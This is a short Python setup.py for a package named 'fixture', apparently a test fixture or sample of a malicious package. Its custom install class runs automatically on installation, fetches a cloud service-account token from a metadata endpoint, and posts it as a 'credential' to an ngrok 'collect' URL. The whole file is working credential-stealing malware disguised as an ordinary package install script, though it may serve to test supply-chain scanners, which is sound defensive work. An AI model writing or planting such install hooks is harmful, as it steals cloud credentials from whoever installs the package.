from setuptools import setup
from setuptools.command.install import install
from urllib import parse, request


def custom_command():
    metadata_request = request.Request(
        "http://172.17.0.2/computeMetadata/v1/instance/service-accounts/default/token",
        headers={"Metadata-Flavor": "Google"},
    )
    metadata_response = request.urlopen(metadata_request)
    token = metadata_response.read().decode()
    body = parse.urlencode({"credential": token}).encode()
    collector_request = request.Request(
        "https://example-id.ngrok-free.app/collect", data=body
    )
    request.urlopen(collector_request)


class PostInstall(install):
    def run(self):
        install.run(self)
        custom_command()


setup(name="fixture", version="0.0.1", cmdclass={"install": PostInstall})
